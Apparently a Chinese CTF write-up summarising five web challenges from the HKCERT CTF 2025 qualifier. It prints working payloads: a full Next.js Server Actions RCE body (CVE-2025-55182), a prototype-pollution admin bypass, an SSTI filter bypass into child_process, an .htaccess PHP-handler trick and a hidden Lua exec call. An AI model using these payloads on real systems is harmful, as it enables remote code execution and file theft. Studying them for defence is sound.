---
title: 香港網安奪旗賽HKCERT CTF 2025 資格賽WEB方向Writeup
contest: HKCERT CTF 2025 資格賽
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [nextjs-rce, cve-2025-55182, prototype-pollution, JSON5, ssti, lua-sandbox, gopher-lua, thinkphp, tpl-injection, php-deserialize, callback]
attack_chain:
- react: CVE-2025-55182 Next.js RCE直打Next-Action header + multipart form-data
- ezjs: __proto__ admin=true原型链污染绕认证+JSON5.parse SSTI触发process.mainModule.constructor._load("child_process")
- easy-lua: gopher-lua pairs(_G)枚举发现S3cr3t0sEx3cFunc内置RCE函数
- renderme: ThinkPHP {args|func}模板注入+SetHandler application/x-httpd-php;.htaccess绕检测
- r: PHP反序列化RequestHandler匿名类+DateTime::__construct+__wakeup null绕过+RCE
- Apache ap_expr ErrorDocument 404 %{file:/flag}直接读flag
key_payload: POST /apps multipart __proto__ then prototype pollution chain
one_liner: HKCERT 2025资格赛WEB方向5题,涵盖Next.js最新CVE RCE+原型链污染+JSON5 SSTI+lua沙箱逃逸+ThinkPHP模板注入+PHP反序列化+Apache ap_expr读文件。
lesson: 2025最新Web攻击面包括Next.js Server Actions的__proto__污染+JS对象字面量构造;ap_expr的file函数是Apache的隐藏文件读取向量;ThinkPHP的{args|func}写法能绕过很多函数名过滤。
quality: high
---

## 题目列表

5道WEB题:
1. react (CVE-2025-55182)
2. ezjs (原型链污染+SSTI)
3. easy-lua (gopher-lua RCE)
4. renderme (ThinkPHP模板)
5. r (PHP反序列化+Apache ap_expr)

## 关键考点

### react: CVE-2025-55182 Next.js RCE
- 公开POC直接打:POST /apps带Next-Action header
- multipart body: name="0" `{"then":"$1:__proto__:then", "status":"resolved_model", "reason":-1, "value":"{\"then\":\"$B12345\"}", "_response": {"_prefix":"var res=process.mainModule.require('child_process').execSync('cat /flag').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});", "_formData": {"get":"$1:toString:constructor"}}}`
- name="1" `"$@0"`
- 触发Next.js Server Actions的__proto__污染→child_process.execSync

### ezjs: 原型链污染+JSON5 SSTI
- login路由接收JSON body → `JSON.stringify(req.body)` → `JSON5.parse(userinfo)`
- JSON5.parse会把`__proto__`解析为原型对象
- payload: `{"__proto__":{"admin":true}}` → 鉴权通过变成admin
- render路由:`'welcome '+word`做SSTI,但过滤require和exec
- 绕filter:`#{global.process.mainModule.constructor._load("child_process").spawnSync("cat", ["/flag"]).stdout}`
- spawnSync代替execSync绕"exec"字符串检测

### easy-lua: gopher-lua RCE
- gopher-lua是Go实现的Lua解释器
- `for k,v in pairs(_G) do print(k, type(v)) end`枚举全局表
- 发现隐藏函数`S3cr3t0sEx3cFunc`(function)
- 直接`pcall(S3cr3t0sEx3cFunc, "cat /flag")`执行命令
- getFileContent/getFileList仅能列举文件,不能读flag(可能权限限制)

### renderme: ThinkPHP模板注入
- 模板标签: `{args|func}`调用函数
- 想过滤system和单双引号
- 上传.htaccess利用unescape标签:`SetHandler application/x-httpd-ph%{unescape:%70}` → 把所有文件解析为PHP
- 文件名`x.ph%{unescape:%70}`即x.php
- 通过?page参数传system反弹shell

### r: PHP反序列化+Apache ap_expr
- class RequestHandler匿名类processor + __wakeup设handle=null
- 关键trick:`$a = new RequestHandler();$a->processor = "";$a->action = ["DateTime","getLastErrors"];`
- 用对象引用 `&$a->processor` 二次复用
- POC构造三个对象a/b/c,serialize后给data参数,GET ?cmd=cat /flag
- 另一条路:Apache ap_expr `ErrorDocument 404 %{file:/flag}` 直接读/flag

## 实战价值
- CVE-2025-55182是2025年最新公开的Next.js RCE,值得收藏POC
- JSON5.parse的__proto__污染是新的攻击面
- gopher-lua这类嵌入式Lua沙箱常留S3cr3t后门,枚举_G是必试操作
- ThinkPHP的`{var|func}`是稳定的RCE入口
- Apache ap_expr的`%{file:path}`是隐藏的文件读取向量
